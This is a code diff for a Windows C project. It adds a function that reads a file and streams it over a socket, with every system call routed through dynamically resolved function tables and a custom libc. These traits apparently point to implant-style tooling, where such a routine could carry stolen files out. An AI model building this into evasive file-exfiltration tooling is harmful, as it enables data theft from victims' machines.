@@ -6,7 +6,7 @@
 #include "headers.h"
 #include "sleaping.h"
 
-#include "mylibc/mylibc.h"
+#include "mylibc.h"
 
 int startup_wsa(winsock_functions_t* ws_funcs)
 {
@@ -247,8 +247,165 @@ cleanup_0:
 
 int cleanup_temp_file(const char* filename, kernel32_functions_t* kernel_funcs)
 {
+	int result = 0;
 	if (kernel_funcs->DeleteFileA(filename))
-		return 0;
+		result = 0;
 	else
+		result = -1;
+	my_free((void*)filename);
+
+	return result;
+}
+
+int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions_t* ws, kernel32_functions_t* kernel32)
+{
+	if (ws == NULL || kernel32 == NULL)
 		return -1;
+
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	int result = -1;
+	int send_result = 0;
+
+	const DWORD BUFFER_SIZE = 64 * 1024;
+	BYTE* buffer = NULL;
+
+	DWORD error = 0;
+
+	hFile = kernel32->CreateFileA(
+		filepath,
+		GENERIC_READ,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
+		NULL
+	);
+
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
+		return -1;
+	}
+
+	LARGE_INTEGER file_size = { 0 };
+	DWORD file_size_low;
+	file_size_low = kernel32->GetFileSize(hFile, NULL);
+	if (file_size_low == INVALID_FILE_SIZE)
+	{
+		kernel32->CloseHandle(hFile);
+		return -1;
+	}
+	file_size.QuadPart = file_size_low;
+
+	buffer = (BYTE*)my_malloc(BUFFER_SIZE);
+	if (buffer == NULL)
+	{
+		kernel32->CloseHandle(hFile);
+		return -1;
+	}
+
+	// set socket nonblocking
+	//u_long mode = 1;
+	//BOOL socket_was_blocking = ws->ioctlsocket(socket, FIONBIO, &mode) == SOCKET_ERROR ? FALSE : TRUE;
+
+	// set 30s timeout
+	//int send_timeout = 30000;
+	//ws->setsockopt(socket, SOL_SOCKET, SO_SNDTIMEO, (const char*)&send_timeout, sizeof(send_timeout));
+
+	DWORD bytes_read = 0;
+	BOOL read_result = TRUE;
+	LONGLONG total_sent = 0;
+
+	while (total_sent < file_size.QuadPart)
+	{
+		read_result = kernel32->ReadFile(hFile, buffer, BUFFER_SIZE, &bytes_read, NULL);
+		if (!read_result || bytes_read == 0)
+		{
+
+			DWORD error = kernel32->GetLastError();
+			if (error != ERROR_SUCCESS && error != ERROR_HANDLE_EOF)
+			{
+				break;
+			}
+
+			if (bytes_read == 0)
+				break;
+		}
+
+		DWORD bytes_to_send = bytes_read;
+		DWORD bytes_sent = 0;
+
+		while (bytes_to_send > 0)
+		{
+			//fd_set write_set;
+			//FD_ZERO(&write_set);
+			//FD_SET(socket, &write_set);
+
+			//struct timeval timeout;
+			//timeout.tv_sec = 30;
+			//timeout.tv_usec = 0;
+
+			//int select_result = ws->select(0, NULL, &write_set, NULL, &timeout);
+
+			//if (select_result == SOCKET_ERROR)
+			//{
+			//	result = -1;
+			//	goto cleanup;
+
+			//}
+			//else if (select_result == 0)
+			//{
+			//	result = -1;
+			//	goto cleanup;
+			//}
+
+			send_result = ws->Send(socket, (const char*)(buffer + bytes_sent), bytes_to_send, 0);
+			if (send_result == SOCKET_ERROR)
+			{
+				int error = ws->WSAGetLastError();
+
+				if (error == WSAEWOULDBLOCK)
+				{
+					kernel32->Sleep(10);
+					continue;
+				}
+
+				result = -1;
+				goto cleanup;
+			}
+			else if (send_result == 0)
+			{
+				result = -1;
+				goto cleanup;
+			}
+
+			bytes_sent += send_result;
+			bytes_to_send -= send_result;
+			total_sent += send_result;
+		}
+
+	}
+
+	if (total_sent == file_size.QuadPart)
+	{
+		result = 0;
+	}
+
+cleanup:
+	//if (socket_was_blocking)
+	//{
+	//	u_long mode = 0;
+	//	BOOL socket_was_blocking = ws->ioctlsocket(socket, FIONBIO, &mode) == SOCKET_ERROR ? FALSE : TRUE;
+	//}
+
+	if (buffer)
+	{
+		my_free(buffer);
+	}
+
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		kernel32->CloseHandle(hFile);
+	}
+
+	return result;
 }
